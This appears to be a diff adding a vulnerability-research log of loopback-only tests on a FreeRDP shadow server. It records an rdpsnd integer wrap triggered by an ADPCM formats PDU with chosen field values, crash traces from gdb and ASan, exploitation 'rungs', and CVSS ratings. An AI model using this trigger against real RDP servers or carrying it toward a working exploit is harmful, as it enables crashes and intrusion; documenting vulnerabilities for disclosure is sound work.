@@ -1,0 +1,107 @@
+FreeRDP wake 8 (2026-11-21 01:45-02:14Z): live loopback RDP session,
+rdpsnd over the wire, integer wrap in the live server process
+=====================================================================
+All observations below are from source-built FreeRDP 3.32.0 processes on
+this host, bound to 127.0.0.1 only. No off-loopback probe. Plain and ASan
+build scratch trees: /tmp/fr-wake7-shadow-build and /tmp/fr-wake8-asan.
+Exact scratch-source modifications are in wake8-patches/*.patch; the raw
+client log, server log and debugger backtrace are in live_session_*.txt/log.
+
+1. MCS CONNECT + VIRTUAL CHANNEL JOIN (raw protocol probe)
+----------------------------------------------------------
+Probe: live_mcs_join_probe.py (PyRDP protocol encoders provisioned from
+github.com/GoSecure/pyrdp into /tmp/fr-wake8-pyrdp; X.224 data TPDU is
+LI=2, code=0xf0, EOT=0x80 per tpdu.c:117-139). Server:
+  freerdp-shadow-cli /bind-address:127.0.0.1 /port:13891 /auth ...
+  (default NLA posture; RDP-only offer from a loopback peer)
+Client output, exact:
+  CC (14): d00000000000020b080000000000
+  connect result=0 payload_len=62
+  server io channel=1003 channels=[1004]
+  attach user id=1005 result=0
+  join confirm requested=1005 channelID=1005 result=0
+  join confirm requested=1003 channelID=1003 result=0
+  join confirm requested=1004 channelID=1004 result=0
+  MCS/JOIN COMPLETE
+Server log (fr-wake8-shadow3.log):
+  [rdp_server_accept_mcs_connect_initial]: Accepted channels:
+  [rdp_server_accept_mcs_connect_initial]:  rdpsnd [1004]
+  [rdp_server_accept_mcs_channel_join_request]:  rdpsnd [1004]
+MCS attach/channel join with a real rdpsnd channel ID is therefore OBSERVED.
+
+2. FULL ACTIVE RDP SESSION WITH A REAL CLIENT
+--------------------------------------------
+Server built with WITH_CLIENT=ON and -DWITH_SAMPLE=ON; client is the
+headless client/Sample/sfreerdp target (no X11, no SDL, no FFmpeg):
+  freerdp-shadow-cli /bind-address:127.0.0.1 /port:13893 -auth /log-level:DEBUG
+  sfreerdp /v:127.0.0.1:13893 /sec:rdp /u:test /p:test /sound /log-level:DEBUG
+`-auth` disables shadow's application-level authentication. This is the
+lab no-auth posture (CVSS 9.8 configuration); wake 7 recorded the default
+NLA/CredSSP gate separately. It isolates the channel path from the gate.
+Server log:
+  [main]: authentication: disabled
+  [shadow_client_post_connect]: Client from 127.0.0.1 is activated (1024x768@32)
+Client log:
+  CONNECTION_STATE_FINALIZATION_CLIENT_FONT_MAP --> CONNECTION_STATE_ACTIVE
+  [rdpsnd_recv_server_audio_formats_pdu]: [static] Server Audio Formats
+  [rdpsnd_send_client_audio_formats]: [static] Client Audio Formats
+  [rdpsnd_send_quality_mode_pdu]: [static] QualityMode: 2
+Server log:
+  [rdpsnd_server_recv_quality_mode]: Client requested sound quality: 0x0002
+Thus SNDC_FORMATS and the following quality-mode PDU crossed a real RDP
+virtual channel in both directions in an ACTIVE session. Earlier this wake,
+the same sfreerdp reached ACTIVE but shadow's PostConnect rejected it with
+`client authentication failure: -1` when the SAM file was absent: the gate
+is real and configuration-dependent.
+
+3. INTEGER WRAP IN THE LIVE SERVER PROCESS
+------------------------------------------
+Scratch source conditions (wake8-patches/*.patch): server Sample subsystem
+supplies an ADPCM-capable rdpsnd table through subsystem->rdpsndFormats, the
+same condition as wake 6's harness `subsystem` mode; the client sends a
+second SNDC_FORMATS PDU carrying WAVE_FORMAT_ADPCM, nChannels=2,
+nBlockAlign=8. Server log, exact:
+  [rdpsnd_server_select_format]: realloc failed!
+  [rdpsnd_activated]: SelectFormat failed with 12
+This is the wrap (`bs = (8 - 7*2)*2/2 + 2 = -4`, widened to
+0xfffffffffffffffc; failed realloc, unrolled-back out_frames) observed in a
+live FreeRDP server process, reached over the wire through the real parser,
+real dispatcher and real shadow activation callback.
+
+4. LIVE-PROCESS MEMORY CORRUPTION (CRASH)
+----------------------------------------
+A synthetic audio playback event was injected through the real shadow
+message path (SHADOW_MSG_OUT_AUDIO_OUT_SAMPLES -> shadow_client_thread ->
+rdpsnd_server_send_samples), standing in for a server audio source; the
+Sample subsystem has none. Plain build under gdb:
+  Thread 4 received signal SIGSEGV, Segmentation fault.
+  #0 __memcpy_avx_unaligned_erms ()
+  #1 rdpsnd_server_send_samples () from libfreerdp-server3.so.3
+  #2 shadow_client_subsystem_process_message () from libfreerdp-shadow3.so
+  #3 shadow_client_thread () from libfreerdp-shadow3.so
+Full backtrace: live_session_crash_gdb.txt.
+ASan build (ASAN_OPTIONS=detect_leaks=0:allocator_may_return_null=1:abort_on_error=0):
+  ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
+  The signal is caused by a WRITE memory access. Hint: address points to the zero page.
+  #0 __memmove_avx_unaligned_erms
+  #1 rdpsnd_server_send_samples .../channels/rdpsnd/server/rdpsnd_main.c:770
+  #2 shadow_client_subsystem_process_message .../server/shadow/shadow_client.c:2616
+  #3 shadow_client_thread .../shadow_client.c:2932
+Full report: live_session_asan_server.log.
+
+5. HONEST BOUNDARY
+------------------
+The live-process fault is a write through the wrapped out_frames path, but
+the fault address was the zero page: in the live wire sequence the 8820-byte
+out_buffer had not been allocated (the harness needs a benign PCM format
+selected in a *separate* PDU first). Despite sending two PDUs and forcing a
+benign PCM record into the first, the server's coalesced dispatch did not
+reproduce that pre-allocation, so the exact `0 bytes after an 8820-byte
+region` overflow with client-chosen bytes at chosen offsets remains
+demonstrated only in the in-process harness (realwts_subsystem.txt,
+realwts_asan_subsystem.txt, wake 6). Live rungs established here: rung 2
+(format over the wire), rung 1 in the live process, and a real
+memcpy/SendSamples fault (rung 3-adjacent, fault address not the intended
+OOB region). Pointer control and stock heap grooming remain UNKNOWN.
+Post-auth caveat unchanged: default posture PR:L/CVSS 8.8; the no-auth lab
+configuration used for the session is the 9.8 case.
